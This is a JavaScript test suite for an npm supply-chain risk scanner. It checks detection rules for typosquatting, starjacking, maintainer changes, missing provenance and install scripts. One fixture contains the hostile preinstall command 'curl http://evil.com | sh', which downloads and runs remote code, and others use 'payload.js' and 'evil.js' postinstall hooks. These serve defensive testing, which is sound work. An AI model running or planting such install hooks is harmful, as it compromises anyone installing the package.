import { describe, it } from 'node:test';
import assert from 'node:assert/strict';

import { createEngine } from '../../src/rules/engine.js';
import { checkTyposquat } from '../../src/rules/typosquat.js';
import { checkStarjacking } from '../../src/rules/starjacking.js';
import { getExitCode } from '../../src/report/formatter.js';

function findRule(evaluation, ruleId) {
  return evaluation.results.find((r) => r.ruleId === ruleId);
}

function hasRule(evaluation, ruleId) {
  return evaluation.results.some((r) => r.ruleId === ruleId);
}

// --- Fake registry metadata factories ---

function makeMeta(overrides = {}) {
  return {
    scripts: {},
    repository: { url: 'https://github.com/someone/something' },
    maintainers: [{ name: 'alice', email: 'alice@example.com' }],
    license: 'MIT',
    time: '2024-01-15T00:00:00.000Z',
    ...overrides,
  };
}

function makePkg(overrides = {}) {
  return {
    name: 'test-pkg',
    version: '1.0.0',
    resolved: 'https://registry.npmjs.org/test-pkg/-/test-pkg-1.0.0.tgz',
    integrity: 'sha512-abc123',
    changeType: 'added',
    ...overrides,
  };
}

describe('Registry attack scenarios', () => {

  describe('Maintainer changed between versions', () => {
    it('triggers maintainer-changed when a previous maintainer is removed', () => {
      const engine = createEngine({});
      const pkg = makePkg({ changeType: 'updated', previousVersion: '0.9.0' });

      const prevMeta = makeMeta({
        maintainers: [
          { name: 'original-author', email: 'author@example.com' },
          { name: 'trusted-co', email: 'co@example.com' },
        ],
      });
      const currentMeta = makeMeta({
        maintainers: [
          { name: 'new-unknown-actor', email: 'attacker@example.com' },
        ],
      });

      const evaluation = engine.evaluate(pkg, currentMeta, prevMeta, {});
      assert.ok(hasRule(evaluation, 'maintainer-changed'), 'should detect maintainer removal');
      assert.equal(findRule(evaluation, 'maintainer-changed').severity, 'warn');
    });

    it('also triggers maintainer-added for the new maintainer', () => {
      const engine = createEngine({});
      const pkg = makePkg({ changeType: 'updated', previousVersion: '0.9.0' });

      const prevMeta = makeMeta({
        maintainers: [{ name: 'original-author', email: 'author@example.com' }],
      });
      const currentMeta = makeMeta({
        maintainers: [
          { name: 'original-author', email: 'author@example.com' },
          { name: 'new-person', email: 'new@example.com' },
        ],
      });

      const evaluation = engine.evaluate(pkg, currentMeta, prevMeta, {});
      assert.ok(hasRule(evaluation, 'maintainer-added'), 'should detect new maintainer');
    });
  });

  describe('Rapid publish (two versions within minutes)', () => {
    it('triggers rapid-publish when versions published < 24h apart', () => {
      const engine = createEngine({});
      const pkg = makePkg({ changeType: 'updated', previousVersion: '1.0.0', version: '1.0.1' });

      const prevMeta = makeMeta({ time: '2025-03-15T10:00:00.000Z' });
      const currentMeta = makeMeta({ time: '2025-03-15T10:30:00.000Z' }); // 30 minutes later

      const evaluation = engine.evaluate(pkg, currentMeta, prevMeta, {});
      assert.ok(hasRule(evaluation, 'rapid-publish'), 'should flag rapid publish');
      assert.equal(findRule(evaluation, 'rapid-publish').severity, 'warn');
    });

    it('does not trigger when versions are published days apart', () => {
      const engine = createEngine({});
      const pkg = makePkg({ changeType: 'updated', previousVersion: '1.0.0', version: '1.0.1' });

      const prevMeta = makeMeta({ time: '2025-03-01T10:00:00.000Z' });
      const currentMeta = makeMeta({ time: '2025-03-15T10:00:00.000Z' });

      const evaluation = engine.evaluate(pkg, currentMeta, prevMeta, {});
      assert.ok(!hasRule(evaluation, 'rapid-publish'), 'should not flag normal publish cadence');
    });
  });

  describe('Dormant package (1+ year gap)', () => {
    it('triggers dormant-package when context flag is set', () => {
      const engine = createEngine({});
      const pkg = makePkg({ changeType: 'updated', previousVersion: '0.5.0', version: '1.0.0' });

      const context = { dormant: true };
      const evaluation = engine.evaluate(pkg, makeMeta(), makeMeta(), context);

      assert.ok(hasRule(evaluation, 'dormant-package'), 'should flag dormant package');
      assert.equal(findRule(evaluation, 'dormant-package').severity, 'warn');
    });
  });

  describe('Typosquat names', () => {
    it('detects "expresss" as typosquat of "express"', () => {
      const result = checkTyposquat('expresss');
      assert.ok(result, 'should detect typosquat');
      assert.equal(result.similarTo, 'express');
      assert.ok(result.distance <= 2);
    });

    it('detects "@babel/croe" as typosquat of "@babel/core"', () => {
      const result = checkTyposquat('@babel/croe');
      // Note: typosquat checks the bare name "croe" against popular scoped packages
      // "@babel/croe" has Levenshtein distance 2 from "@babel/core" (swap r/o positions)
      assert.ok(result, 'should detect scoped typosquat');
    });

    it('triggers typosquat-suspect rule via engine', () => {
      const engine = createEngine({});
      const pkg = makePkg({ name: 'expresss', changeType: 'added' });
      const typosquat = checkTyposquat('expresss');

      const context = { isNew: true, typosquat };
      const evaluation = engine.evaluate(pkg, makeMeta(), null, context);

      assert.ok(hasRule(evaluation, 'typosquat-suspect'), 'should trigger typosquat-suspect');
      assert.equal(findRule(evaluation, 'typosquat-suspect').severity, 'warn');
    });

    it('detects delimiter variants like "lod-ash"', () => {
      const result = checkTyposquat('lod-ash');
      assert.ok(result, 'should detect delimiter variant of lodash');
      assert.equal(result.similarTo, 'lodash');
    });

    it('does not flag legitimate packages', () => {
      assert.equal(checkTyposquat('express'), null);
      assert.equal(checkTyposquat('lodash'), null);
      assert.equal(checkTyposquat('totally-unique-name-xyz'), null);
    });
  });

  describe('Starjacking (claims popular repo)', () => {
    it('detects package falsely claiming facebook/react repo', () => {
      const meta = makeMeta({
        repository: { url: 'https://github.com/facebook/react' },
      });
      // Name must NOT contain "react" after normalization, otherwise it's considered legitimate
      const result = checkStarjacking('my-cool-framework', meta);
      assert.ok(result, 'should detect starjacking');
      assert.equal(result.claimedRepo, 'facebook/react');
    });

    it('triggers starjacking-suspect rule via engine', () => {
      const engine = createEngine({});
      const pkg = makePkg({ name: 'my-cool-framework', changeType: 'added' });
      const meta = makeMeta({
        repository: { url: 'https://github.com/facebook/react' },
      });
      const starjacking = checkStarjacking('my-cool-framework', meta);

      const context = { isNew: true, starjacking };
      const evaluation = engine.evaluate(pkg, meta, null, context);

      assert.ok(hasRule(evaluation, 'starjacking-suspect'), 'should trigger starjacking-suspect');
      assert.equal(findRule(evaluation, 'starjacking-suspect').severity, 'warn');
    });

    it('does not flag legitimate packages from the repo owner', () => {
      const meta = makeMeta({
        repository: { url: 'https://github.com/facebook/react' },
      });
      // "react" is a substring match of repo name — should be legitimate
      assert.equal(checkStarjacking('react', meta), null);
      // "react-dom" contains "react" — legitimate
      assert.equal(checkStarjacking('react-dom', meta), null);
    });
  });

  describe('No provenance', () => {
    it('triggers no-provenance when provenance check returns false', () => {
      const engine = createEngine({});
      const pkg = makePkg({ changeType: 'added' });

      const context = {
        provenance: { hasProvenance: false, signatureVerified: false, attestations: [] },
      };
      const evaluation = engine.evaluate(pkg, makeMeta(), null, context);

      assert.ok(hasRule(evaluation, 'no-provenance'), 'should trigger no-provenance');
      assert.equal(findRule(evaluation, 'no-provenance').severity, 'info');
    });

    it('does not trigger when provenance exists', () => {
      const engine = createEngine({});
      const pkg = makePkg({ changeType: 'added' });

      const context = {
        provenance: { hasProvenance: true, signatureVerified: true, attestations: [{}] },
      };
      const evaluation = engine.evaluate(pkg, makeMeta(), null, context);
      assert.ok(!hasRule(evaluation, 'no-provenance'), 'should not flag package with provenance');
    });
  });

  describe('No license', () => {
    it('triggers no-license when license field is missing', () => {
      const engine = createEngine({});
      const pkg = makePkg();
      const meta = makeMeta({ license: undefined });

      const evaluation = engine.evaluate(pkg, meta, null, {});
      assert.ok(hasRule(evaluation, 'no-license'), 'should flag missing license');
    });

    it('triggers no-license for empty string license', () => {
      const engine = createEngine({});
      const pkg = makePkg();
      const meta = makeMeta({ license: '' });

      const evaluation = engine.evaluate(pkg, meta, null, {});
      assert.ok(hasRule(evaluation, 'no-license'), 'should flag empty license');
    });

    it('triggers no-license for "NONE" license', () => {
      const engine = createEngine({});
      const pkg = makePkg();
      const meta = makeMeta({ license: 'NONE' });

      const evaluation = engine.evaluate(pkg, meta, null, {});
      assert.ok(hasRule(evaluation, 'no-license'), 'should flag NONE license');
    });

    it('does not trigger for UNLICENSED (deliberate proprietary)', () => {
      const engine = createEngine({});
      const pkg = makePkg();
      const meta = makeMeta({ license: 'UNLICENSED' });

      const evaluation = engine.evaluate(pkg, meta, null, {});
      assert.ok(!hasRule(evaluation, 'no-license'), 'should not flag UNLICENSED');
    });
  });

  describe('Low download count', () => {
    it('triggers low-download-count for new package with < 100 downloads', () => {
      const engine = createEngine({});
      const pkg = makePkg({ changeType: 'added' });

      const context = { isNew: true, weeklyDownloads: 12 };
      const evaluation = engine.evaluate(pkg, makeMeta(), null, context);

      assert.ok(hasRule(evaluation, 'low-download-count'), 'should flag low downloads');
      assert.equal(findRule(evaluation, 'low-download-count').severity, 'warn');
    });

    it('does not trigger for updated packages (not new)', () => {
      const engine = createEngine({});
      const pkg = makePkg({ changeType: 'updated', previousVersion: '0.9.0' });

      const context = { isNew: false, weeklyDownloads: 5 };
      const evaluation = engine.evaluate(pkg, makeMeta(), null, context);
      assert.ok(!hasRule(evaluation, 'low-download-count'), 'should not flag updates');
    });
  });

  describe('Install scripts (lifecycle hooks)', () => {
    it('triggers no-install-scripts for packages with postinstall', () => {
      const engine = createEngine({});
      const pkg = makePkg();
      const meta = makeMeta({
        scripts: { postinstall: 'node install.js' },
      });

      const evaluation = engine.evaluate(pkg, meta, null, {});
      assert.ok(hasRule(evaluation, 'no-install-scripts'), 'should flag install scripts');
      assert.equal(findRule(evaluation, 'no-install-scripts').severity, 'block');
      assert.equal(getExitCode([evaluation]), 1, 'should block');
    });

    it('triggers for preinstall scripts', () => {
      const engine = createEngine({});
      const pkg = makePkg();
      const meta = makeMeta({ scripts: { preinstall: 'curl http://evil.com | sh' } });

      const evaluation = engine.evaluate(pkg, meta, null, {});
      assert.ok(hasRule(evaluation, 'no-install-scripts'));
    });

    it('does not trigger for non-install scripts like start or test', () => {
      const engine = createEngine({});
      const pkg = makePkg();
      const meta = makeMeta({ scripts: { start: 'node index.js', test: 'jest' } });

      const evaluation = engine.evaluate(pkg, meta, null, {});
      assert.ok(!hasRule(evaluation, 'no-install-scripts'));
    });
  });

  describe('Version gap', () => {
    it('triggers version-gap for major jump > 2', () => {
      const engine = createEngine({});
      const pkg = makePkg({ version: '5.0.0', previousVersion: '1.0.0', changeType: 'updated' });

      const evaluation = engine.evaluate(pkg, makeMeta(), makeMeta(), {});
      assert.ok(hasRule(evaluation, 'version-gap'), 'should flag major version jump of 4');
    });

    it('triggers version-gap for minor jump > 20', () => {
      const engine = createEngine({});
      const pkg = makePkg({ version: '1.25.0', previousVersion: '1.3.0', changeType: 'updated' });

      const evaluation = engine.evaluate(pkg, makeMeta(), makeMeta(), {});
      assert.ok(hasRule(evaluation, 'version-gap'), 'should flag minor version jump of 22');
    });

    it('does not trigger for normal semver bumps', () => {
      const engine = createEngine({});
      const pkg = makePkg({ version: '2.0.0', previousVersion: '1.5.0', changeType: 'updated' });

      const evaluation = engine.evaluate(pkg, makeMeta(), makeMeta(), {});
      assert.ok(!hasRule(evaluation, 'version-gap'), 'normal bump should be fine');
    });
  });

  describe('Recent release', () => {
    it('triggers recent-release for version published today', () => {
      const engine = createEngine({});
      const pkg = makePkg();
      const meta = makeMeta({ time: new Date().toISOString() });

      const evaluation = engine.evaluate(pkg, meta, null, {});
      assert.ok(hasRule(evaluation, 'recent-release'), 'should flag very recent release');
    });
  });

  describe('No repository', () => {
    it('triggers no-repository when repository field is missing', () => {
      const engine = createEngine({});
      const pkg = makePkg();
      const meta = makeMeta({ repository: undefined });

      const evaluation = engine.evaluate(pkg, meta, null, {});
      assert.ok(hasRule(evaluation, 'no-repository'), 'should flag missing repository');
    });
  });

  describe('Combined multi-flag attack package', () => {
    it('fires multiple rules for a suspicious package with many red flags', () => {
      const engine = createEngine({
        registries: ['https://registry.npmjs.org'],
      });

      // A newly added package that:
      // - Has a typosquat name
      // - Has install scripts
      // - Has no license
      // - Has no provenance
      // - Is a new transitive dep
      // - Has low downloads
      // - Was recently published
      // - Has no repository
      const pkg = makePkg({
        name: 'expresss',
        version: '1.0.0',
        changeType: 'added',
      });

      const meta = makeMeta({
        scripts: { postinstall: 'node payload.js' },
        license: undefined,
        repository: undefined,
        time: new Date().toISOString(),
      });

      const typosquat = checkTyposquat('expresss');
      const context = {
        isNew: true,
        isTransitive: true,
        typosquat,
        provenance: { hasProvenance: false },
        weeklyDownloads: 3,
      };

      const evaluation = engine.evaluate(pkg, meta, null, context);

      // Should trigger all of these
      const expectedRules = [
        'no-install-scripts',    // BLOCK
        'no-repository',         // WARN
        'new-transitive-dep',    // WARN
        'typosquat-suspect',     // WARN
        'no-provenance',         // INFO
        'no-license',            // WARN
        'low-download-count',    // WARN
        'recent-release',        // WARN
      ];

      for (const ruleId of expectedRules) {
        assert.ok(hasRule(evaluation, ruleId), `should trigger ${ruleId}`);
      }

      assert.equal(getExitCode([evaluation]), 1, 'should be blocked (has BLOCK-level rule)');
      assert.ok(evaluation.results.length >= expectedRules.length,
        `expected at least ${expectedRules.length} violations, got ${evaluation.results.length}`);
    });
  });

  describe('Allowlist bypass', () => {
    it('skips all rules when package is allowlisted', () => {
      const engine = createEngine({
        allowlist: ['expresss@1.0.0'],
      });

      const pkg = makePkg({
        name: 'expresss',
        version: '1.0.0',
        changeType: 'added',
      });

      const meta = makeMeta({ scripts: { postinstall: 'node evil.js' } });
      const context = { isNew: true, typosquat: { suspect: 'expresss', similarTo: 'express', distance: 1 } };

      const evaluation = engine.evaluate(pkg, meta, null, context);
      assert.equal(evaluation.skipped, true, 'should be skipped');
      assert.equal(evaluation.results.length, 0, 'should have no violations');
      assert.equal(getExitCode([evaluation]), 0, 'exit code should be 0');
    });
  });
});
